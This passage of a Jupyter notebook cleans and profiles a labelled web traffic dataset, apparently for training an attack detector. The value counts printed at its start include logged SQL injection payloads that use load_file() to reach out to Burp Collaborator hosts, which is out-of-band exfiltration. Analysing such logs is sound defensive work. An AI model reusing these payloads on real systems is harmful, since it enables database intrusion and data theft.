       "page=(select%20load_file('%5c%5c%5c%5c5pvn4mibkq5i9727z9zfcpg9h0nsbjd74uuij.burpcollaborator.net%5c%5cbrt'))&v_num=111|23|800a000d|������_��ġ����_�ʽ��ϴ�.:_'page'                                                                           1\n",
       "page=1'%2b(select%20load_file('%5c%5c%5c%5c6jqoynccerzj38w8tatg6qaab1ht5k88zvpje.burpcollaborator.net%5c%5ccls'))%2b'&v_num=111|23|800a000d|������_��ġ����_�ʽ��ϴ�.:_'page'                                                                  1\n",
       "?boardId=free&boardNo=162980390089131&command=READ&page=1&categoryId=-1                                                                                                                                                                     1\n",
       "Name: http_query, Length: 663, dtype: int64"
      ]
     },
     "execution_count": 12,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "web_df[\"http_query\"].value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [],
   "source": [
    "web_df[\"http_query\"] = web_df[\"http_query\"].fillna('-')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "0"
      ]
     },
     "execution_count": 14,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "web_df[\"http_query\"].isnull().sum()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### rcvd_bytes"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "237.0    42\n",
       "235.0    41\n",
       "240.0    40\n",
       "236.0    40\n",
       "588.0    38\n",
       "         ..\n",
       "677.0     1\n",
       "879.0     1\n",
       "812.0     1\n",
       "580.0     1\n",
       "631.0     1\n",
       "Name: rcvd_bytes, Length: 410, dtype: int64"
      ]
     },
     "execution_count": 15,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "web_df[\"rcvd_bytes\"].value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [],
   "source": [
    "web_df[\"rcvd_bytes\"] = web_df[\"rcvd_bytes\"].fillna(0)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "0"
      ]
     },
     "execution_count": 17,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "web_df[\"rcvd_bytes\"].isnull().sum()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### sent_bytes"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "332.0      10842\n",
       "521.0        410\n",
       "30447.0      229\n",
       "5573.0        73\n",
       "30446.0       60\n",
       "           ...  \n",
       "681.0          1\n",
       "5578.0         1\n",
       "23604.0        1\n",
       "5600.0         1\n",
       "15478.0        1\n",
       "Name: sent_bytes, Length: 484, dtype: int64"
      ]
     },
     "execution_count": 18,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "web_df[\"sent_bytes\"].value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [],
   "source": [
    "web_df[\"sent_bytes\"] = web_df[\"sent_bytes\"].fillna(0)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "0"
      ]
     },
     "execution_count": 20,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "web_df[\"rcvd_bytes\"].isnull().sum()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 프로파일링"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<class 'pandas.core.frame.DataFrame'>\n",
      "RangeIndex: 40182 entries, 0 to 40181\n",
      "Data columns (total 12 columns):\n",
      " #   Column        Non-Null Count  Dtype  \n",
      "---  ------        --------------  -----  \n",
      " 0   index         40182 non-null  int64  \n",
      " 1   direction     40182 non-null  int64  \n",
      " 2   http_method   40182 non-null  object \n",
      " 3   http_query    40182 non-null  object \n",
      " 4   http_version  40182 non-null  object \n",
      " 5   http_url      40182 non-null  object \n",
      " 6   http_status   40182 non-null  int64  \n",
      " 7   pkt_bytes     40182 non-null  int64  \n",
      " 8   rcvd_bytes    40182 non-null  float64\n",
      " 9   referer       40182 non-null  object \n",
      " 10  sent_bytes    40182 non-null  float64\n",
      " 11  label_attack  40182 non-null  object \n",
      "dtypes: float64(2), int64(4), object(6)\n",
      "memory usage: 3.7+ MB\n"
     ]
    }
   ],
   "source": [
    "web_df.info()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.10"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
